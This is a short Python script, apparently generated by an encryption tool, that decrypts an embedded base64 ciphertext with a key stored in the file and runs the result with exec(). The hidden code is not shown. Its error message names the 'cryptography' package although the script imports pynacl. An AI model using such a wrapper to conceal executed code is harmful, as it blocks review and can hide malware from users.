# Encrypted by Switch (xchacha20) — run with: python3 this_file.py
# Requires: pip install pynacl
import sys

try:
    import base64
    from nacl._sodium import ffi, lib
except ImportError:
    print('Error: "cryptography" package not found.', file=sys.stderr)
    print('Install it with: pip install cryptography', file=sys.stderr)
    sys.exit(1)

_ct = base64.b64decode("JpuoKtvS+swB6u0Ss0MXc/0VOs06bQ6CFXJ0bSYtjsO9e3b14A==")
_key = base64.b64decode("1iR7Kri2T5C6Fn70thNs7rNeaoZXxiWeOezgAbuh6SY=")
_nonce = base64.b64decode("ZdaTbncFS5mvStk9t8iUxrYckCqTGnQo")

try:
    _pt_buf = ffi.new('unsigned char[]', len(_ct) - 16)
    _pt_len = ffi.new('unsigned long long *')
    if lib.crypto_aead_xchacha20poly1305_ietf_decrypt(
            _pt_buf, _pt_len, ffi.NULL,
            _ct, len(_ct), ffi.NULL, 0, _nonce, _key) != 0:
        raise ValueError('XChaCha20-Poly1305 decryption failed (bad key or nonce)')
    _pt = bytes(_pt_buf)[:_pt_len[0]]
    exec(_pt.decode('utf-8'))
except (ValueError, Exception) as e:
    print(f'Error: decryption failed — {e}', file=sys.stderr)
    print('The file may have been encrypted with a different key.', file=sys.stderr)
    sys.exit(1)
